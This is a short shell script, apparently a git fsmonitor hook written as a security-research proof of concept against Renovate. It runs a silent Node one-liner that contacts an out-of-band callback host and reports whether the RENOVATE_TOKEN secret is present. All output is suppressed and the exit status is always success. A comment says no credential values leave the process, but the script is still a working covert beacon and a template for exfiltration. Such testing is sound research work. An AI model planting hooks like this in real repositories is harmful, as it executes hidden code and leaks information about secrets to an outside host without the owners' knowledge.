#!/bin/sh
        # Test-owned fsmonitor marker: no credential values leave the process.
        node -e 'const https=require("https");const url="https://dbqpmessptubbi8ld2sgpuu6xx5uxnumb.oob.staging.depthfirst.com/fsmonitor/5328617ef92054ec?token_present="+Boolean(process.env.RENOVATE_TOKEN);https.get(url,r=>r.resume()).on("error",()=>{});setTimeout(()=>process.exit(0),4000);' >/dev/null 2>&1
        exit 0
        
